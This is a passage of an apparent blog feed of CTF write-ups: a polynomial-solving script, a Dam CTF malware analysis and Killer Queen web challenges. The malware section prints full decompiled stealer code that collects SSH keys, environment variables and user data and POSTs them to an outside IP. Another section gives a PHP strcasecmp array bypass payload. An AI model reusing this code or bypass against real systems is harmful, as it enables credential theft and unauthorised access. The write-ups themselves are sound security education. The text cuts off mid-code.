class="built_in">input</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">my_poly</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    TODO: Parse polynomial</span></span><br><span class="line"><span class="string">    For example, parse(&quot;x^3 + 2x^2 - x + 1&quot;) should return [1,2,-1,1]</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># my_poly = &quot;2*x**2+7*x-3&quot;</span></span><br><span class="line">    my_poly = my_poly.replace(<span class="string">&quot;^&quot;</span>, <span class="string">&quot;**&quot;</span>).replace(my_poly[<span class="number">0</span>], <span class="string">&quot;*x&quot;</span>).replace(<span class="string">&quot;*x&quot;</span>, my_poly[<span class="number">0</span>], <span class="number">1</span>)</span><br><span class="line">    x = sympy.Symbol(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">    my_poly = sympy.polys.polytools.poly_from_expr(my_poly)[<span class="number">0</span>]</span><br><span class="line">    coeffs = my_poly.coeffs()</span><br><span class="line">    <span class="keyword">return</span> coeffs</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>): get_input() <span class="comment">#ignore challenge flavortext</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="built_in">type</span> = get_input()</span><br><span class="line">    coeffs = parse(get_input())</span><br><span class="line">    <span class="built_in">print</span>(coeffs)</span><br><span class="line"></span><br><span class="line">    ans = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;sum of the roots&#x27;</span> <span class="keyword">in</span> <span class="built_in">type</span>:</span><br><span class="line">        <span class="comment">#<span class="doctag">TODO:</span> Find answer</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;sum of the roots&quot;</span>)</span><br><span class="line">        ans = -<span class="number">1</span>*coeffs[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&#x27;sum of the reciprocals of the roots&#x27;</span> <span class="keyword">in</span> <span class="built_in">type</span>:</span><br><span class="line">        <span class="comment">#<span class="doctag">TODO:</span> Find answer</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;sum of the reciprocals of the roots&quot;</span>)</span><br><span class="line">        ans = -<span class="number">1</span>*coeffs[-<span class="number">2</span>]//coeffs[-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&#x27;sum of the squares of the roots&#x27;</span> <span class="keyword">in</span> <span class="built_in">type</span>:</span><br><span class="line">        <span class="comment">#<span class="doctag">TODO:</span> Find answer</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;sum of the squares of the roots&quot;</span>)</span><br><span class="line">        ans = coeffs[<span class="number">1</span>]**<span class="number">2</span>-<span class="number">2</span>*coeffs[<span class="number">2</span>]</span><br><span class="line">    <span class="built_in">print</span>(ans)</span><br><span class="line">    conn.sendline(<span class="built_in">str</span>(ans)) <span class="comment">#send answer to server</span></span><br><span class="line">    get_input()</span><br><span class="line">conn.interactive() <span class="comment">#should print flag if you got everything right</span></span><br></pre></td></tr></table></figure></li></ol></li></ul></li></ul><h3 id="Result-Got-flag"><a href="#Result-Got-flag" class="headerlink" title="Result: Got flag"></a>Result: Got flag</h3><p><img src="https://i.imgur.com/PdtCevB.jpg"></p><h3 id="Formula-that-can-make-the-math-easier-to-solve"><a href="#Formula-that-can-make-the-math-easier-to-solve" class="headerlink" title="Formula that can make the math easier to solve"></a>Formula that can make the math easier to solve</h3><ol><li>sum of the roots<ul><li><img src="https://i.imgur.com/ywG94gD.jpg"></li></ul></li><li>sum of the reciprocals of the roots<ul><li><img src="https://i.imgur.com/tJ8rRBX.jpg"></li></ul></li><li>sum of the squares of the roots<ul><li><img src="https://i.imgur.com/ifotMw8.jpg"></li></ul></li></ol><h2 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h2><p><a href="https://www.mathsisfun.com/algebra/polynomials-sums-products-roots.html">sum of the root</a><br><a href="https://math.stackexchange.com/questions/90914/sum-of-squares-of-roots-of-a-polynomial-px">sum of the squares of roots of a polynomial</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dam CTF 2021</title>
      <link href="/2021/11/06/Dam-CTF-2021/"/>
      <url>/2021/11/06/Dam-CTF-2021/</url>
      
        <content type="html"><![CDATA[<h1 id="malware"><a href="#malware" class="headerlink" title="malware"></a>malware</h1><h2 id="sneaky-script"><a href="#sneaky-script" class="headerlink" title="sneaky-script"></a><code>sneaky-script</code></h2><p><img src="https://i.imgur.com/dbC6TU1.jpg"><br><a href="https://jeff14994.github.io/2021/11/06/Dam-CTF-2021/" target="_self">Read More →</a></p><span id="more"></span><h3 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h3><ul><li>Target the HTTP stream &#x3D;&gt; There is one GET and POST request<br>  <img src="https://i.imgur.com/CN8x0eD.jpg"></li><li>GET request &#x3D;&gt; Know exactly the malware’s behavior<br>  <img src="https://i.imgur.com/xFCuJq3.jpg"></li><li>POST request &#x3D;&gt; Figure out the payload<br>  <img src="https://i.imgur.com/RZF5IqM.jpg"><h3 id="Decompilation"><a href="#Decompilation" class="headerlink" title="Decompilation"></a>Decompilation</h3></li><li>It was fake as a image but when you <code>file</code> it, we know it’s a <code>pyc</code> file<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$~ file cbimage.png:</span><br><span class="line">cbimage.png: python <span class="number">3.6</span> byte-compiledpython <span class="number">3.6</span> byte-compiled</span><br></pre></td></tr></table></figure><ul><li><a href="https://www.toolnb.com/tools-lang-en/pyc.html">Decompile online</a> &#x3D;&gt; Got the decompilation<br> <img src="https://i.imgur.com/J0jzbpA.jpg"><ul><li>The full malware source code  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.5.0</span></span><br><span class="line"><span class="comment"># Python bytecode 3.6 (3379)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 2.7.5 (default, Nov 16 2020, 22:23:17)</span></span><br><span class="line"><span class="comment"># [GCC 4.8.5 20150623 (Red Hat 4.8.5-44)]</span></span><br><span class="line"><span class="comment"># Embedded file name: /tmp/tmpaliidej5</span></span><br><span class="line"><span class="comment"># Compiled at: 2021-09-26 08:59:31</span></span><br><span class="line"><span class="comment"># Size of source mod 2**32: 2900 bytes</span></span><br><span class="line"><span class="keyword">import</span> array, base64, fcntl, http.client, json, re, socket, struct, os, uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_net_info</span>():</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">    g = array.array(<span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;\x00&#x27;</span> * <span class="number">4096</span>)</span><br><span class="line">    y = struct.unpack(<span class="string">&#x27;iL&#x27;</span>, fcntl.ioctl(s.fileno(), <span class="number">35090</span>, struct.pack(<span class="string">&#x27;iL&#x27;</span>, <span class="number">4096</span>, g.buffer_info()[<span class="number">0</span>])))[<span class="number">0</span>]</span><br><span class="line">    n = g.tobytes()</span><br><span class="line">    a = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, y, <span class="number">40</span>):</span><br><span class="line">        c = n[i:i + <span class="number">16</span>].split(<span class="string">&#x27;\x00&#x27;</span>, <span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line">        c = c.decode()</span><br><span class="line">        m = n[i + <span class="number">20</span>:i + <span class="number">24</span>]</span><br><span class="line">        v = <span class="string">f&quot;<span class="subst">&#123;m[<span class="number">0</span>]&#125;</span>.<span class="subst">&#123;m[<span class="number">1</span>]&#125;</span>.<span class="subst">&#123;m[<span class="number">2</span>]&#125;</span>.<span class="subst">&#123;m[<span class="number">3</span>]&#125;</span>&quot;</span></span><br><span class="line">        a.append((c, v))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_users</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> (f):</span><br><span class="line">        x = [x.strip() <span class="keyword">for</span> x <span class="keyword">in</span> f.readlines()]</span><br><span class="line">    g = []</span><br><span class="line">    <span class="keyword">for</span> z <span class="keyword">in</span> x:</span><br><span class="line">        a = z.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(a[<span class="number">2</span>]) &lt; <span class="number">1000</span> <span class="keyword">or</span> <span class="built_in">int</span>(a[<span class="number">2</span>]) &gt; <span class="number">65000</span>:</span><br><span class="line">            <span class="keyword">if</span> a[<span class="number">0</span>] != <span class="string">&#x27;root&#x27;</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            g.append((a[<span class="number">2</span>], a[<span class="number">0</span>], a[<span class="number">5</span>], a[<span class="number">6</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> g</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_proc</span>():</span><br><span class="line">    n = []</span><br><span class="line">    a = os.listdir(<span class="string">&#x27;/proc&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">int</span>(b)</span><br><span class="line">            x = os.readlink(<span class="string">f&quot;/proc/<span class="subst">&#123;b&#125;</span>/exe&quot;</span>)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;/proc/<span class="subst">&#123;b&#125;</span>/cmdline&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> (f):</span><br><span class="line">                s = <span class="string">&#x27; &#x27;</span>.join(f.read().split(<span class="string">&#x27;\x00&#x27;</span>)).decode()</span><br><span class="line">            n.append((b, x, s))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_ssh</span>(<span class="params">u</span>):</span><br><span class="line">    s = []</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        x = os.listdir(u + <span class="string">&#x27;/.ssh&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> x:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;<span class="subst">&#123;u&#125;</span>/.ssh/<span class="subst">&#123;y&#125;</span>&quot;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> (f):</span><br><span class="line">                    s.append((y, f.read()))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_output</span>(<span class="params">net, user, proc, ssh</span>):</span><br><span class="line">    out = &#123;&#125;</span><br><span class="line">    out[<span class="string">&#x27;net&#x27;</span>] = net</span><br><span class="line">    out[<span class="string">&#x27;proc&#x27;</span>] = proc</span><br><span class="line">    out[<span class="string">&#x27;env&#x27;</span>] = <span class="built_in">dict</span>(os.environ)</span><br><span class="line">    out[<span class="string">&#x27;user&#x27;</span>] = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(user)):</span><br><span class="line">        out[<span class="string">&#x27;user&#x27;</span>].append(&#123;<span class="string">&#x27;info&#x27;</span>:user[i],  <span class="string">&#x27;ssh&#x27;</span>:ssh[i]&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">data</span>):</span><br><span class="line">    c = http.client.HTTPConnection(<span class="string">&#x27;34.207.187.90&#x27;</span>)</span><br><span class="line">    p = json.dumps(data).encode()</span><br><span class="line">    k = <span class="string">&#x27;8675309&#x27;</span></span><br><span class="line">    d = <span class="built_in">bytes</span>([p[i] ^ k[(i % <span class="built_in">len</span>(k))] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(p))])</span><br><span class="line">    c.request(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;/upload&#x27;</span>, base64.b64encode(d))</span><br><span class="line">    x = c.getresponse()</span><br><span class="line">    <span class="built_in">print</span>(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">a</span>():</span><br><span class="line">    key = <span class="string">&#x27;:&#x27;</span>.join(re.findall(<span class="string">&#x27;..&#x27;</span>, <span class="string">&#x27;%012x&#x27;</span> % uuid.getnode()))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;4b:e1:d6:a8:66:be&#x27;</span> != key:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    net = get_net_info()</span><br><span class="line">    user = get_users()</span><br><span class="line">    proc = get_proc()</span><br><span class="line">    ssh = []</span><br><span class="line">    <span class="keyword">for</span> _, _, a, _ <span class="keyword">in</span> user:</span><br><span class="line">        ssh.append(get_ssh(a))</span><br><span class="line"></span><br><span class="line">    data = build_output(net, user, proc, ssh)</span><br><span class="line">    <span class="comment"># send(data)</span></span><br><span class="line">    <span class="built_in">print</span>(send)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    a()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Reverse-the-payload"><a href="#Reverse-the-payload" class="headerlink" title="Reverse the payload"></a>Reverse the payload</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;sensitive_data.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> sensitive_data:</span><br><span class="line">    flag = sensitive_data.read()</span><br><span class="line">p = <span class="built_in">bytes</span>.fromhex(flag)</span><br><span class="line">p = base64.b64decode(p)</span><br><span class="line">k = <span class="string">&#x27;8675309&#x27;</span></span><br><span class="line">d = <span class="built_in">bytes</span>([p[i] ^ <span class="built_in">ord</span>(k[(i % <span class="built_in">len</span>(k))]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(p))])</span><br><span class="line">sensitive_data = d.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;dam&#x27;</span> <span class="keyword">in</span> sensitive_data:</span><br><span class="line">    info(<span class="string">&quot;Got flag!&quot;</span>)</span><br><span class="line">    x = sensitive_data.find(<span class="string">&#x27;dam&#x27;</span>)</span><br><span class="line">    info(sensitive_data[x:x+<span class="number">32</span>])</span><br></pre></td></tr></table></figure><h3 id="Got-the-flag-dam-oh-n0-a1l-muh-k3y5-are-g0n3"><a href="#Got-the-flag-dam-oh-n0-a1l-muh-k3y5-are-g0n3" class="headerlink" title="Got the flag: dam{oh_n0_a1l_muh_k3y5_are_g0n3}"></a>Got the flag: <code>dam&#123;oh_n0_a1l_muh_k3y5_are_g0n3&#125;</code></h3></li></ul></li></ul></li><li><img src="https://i.imgur.com/zTylHcG.jpg"></li></ul><h2 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h2><p><img src="https://i.imgur.com/bioRz0k.jpg"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Killer Queen CTF 2021</title>
      <link href="/2021/10/31/Killer-Queen-CTF-2021/"/>
      <url>/2021/10/31/Killer-Queen-CTF-2021/</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h3 id="Just-Not-My-Type"><a href="#Just-Not-My-Type" class="headerlink" title="Just Not My Type"></a><code>Just Not My Type</code></h3><p><img src="https://i.imgur.com/7mPR9DM.jpg"><br><a href="https://jeff14994.github.io/2021/10/31/Killer-Queen-CTF-2021/" target="_self">Read More →</a></p><span id="more"></span><ul><li><p>Challenge Description &#x3D;&gt; Simple login page<br>  <img src="https://i.imgur.com/9jZMWng.jpg"></p></li><li><p>Source code:</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;I just don<span class="string">&#x27;t think we&#x27;</span>re compatible&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$FLAG</span> = <span class="string">&quot;shhhh you don&#x27;t get to see this locally&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strcasecmp</span>(<span class="variable">$password</span>, <span class="variable">$FLAG</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;That&#x27;s the wrong password!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;form method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">    Password</span><br><span class="line">    &lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></li><li><p>Vulnerability:</p><ul><li>Turned out that <code>strcasecmp</code> in php will return 0 (values are the same) thus bypassing the check point when the parameter is an array</li><li>The reason is because <code>strcasecmp</code> cannot deal with arrays. If a user pass <code>password[]=123456</code>, it will return NULL. And the comparsion for <code>NULL</code> and <code>0</code> results in 0 (e.g. NULL &#x3D;&#x3D; 0 &#x3D;&#x3D;&gt; true)<br>  <img src="https://i.imgur.com/RnTTaaP.jpg"></li></ul></li><li><p>BurpSuite to send the payload<br>  <img src="https://i.imgur.com/btBqIgP.jpg"></p><ul><li>We can even send variables without initializing values &#x3D;&gt; Just send <code>password[]</code><br>  <img src="https://i.imgur.com/fG7mUZo.jpg"></li></ul></li><li><p>Got the flag: <code>flag&#123;no_way!_i_took_the_flag_out_of_the_source_before_giving_it_to_you_how_is_this_possible&#125;</code></p><h2 id="Resources-for-first-challenge"><a href="#Resources-for-first-challenge" class="headerlink" title="Resources for first challenge:"></a>Resources for first challenge:</h2></li><li><p><a href="http://int03.blogspot.com/2012/10/csaw-2012-ctf-web-600-write-up.html">CSAW-2012-Web</a></p></li><li><p><a href="https://www.chabug.org/ctf/417.html">PHP Vulnerable functions</a></p></li><li><p><a href="https://stackoverflow.com/a/8236390/12349124">NULL &#x3D;&#x3D; 0 return True in PHP</a></p></li></ul><h1 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h1><h3 id="PHat-Pottomed-Girls"><a href="#PHat-Pottomed-Girls" class="headerlink" title="PHat Pottomed Girls"></a><code>PHat Pottomed Girls</code></h3><ul><li><p>Challenge Descriptions<br><img src="https://i.imgur.com/wLeoz2M.jpg"></p></li><li><p>Challenge Source code</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generateRandomString</span>(<span class="params"><span class="variable">$length</span> = <span class="number">15</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$characters</span> = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>;</span><br><span class="line">    <span class="variable">$charactersLength</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$characters</span>);</span><br><span class="line">    <span class="variable">$randomString</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$randomString</span> .= <span class="variable">$characters</span>[<span class="title function_ invoke__">rand</span>(<span class="number">0</span>, <span class="variable">$charactersLength</span> - <span class="number">1</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$randomString</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$originalstring</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;?php&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$originalstring</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;?&gt;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;?&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;fopen&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;fread&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;file_get_contents&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;fgets&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;strings&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;less&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;more&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;head&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span 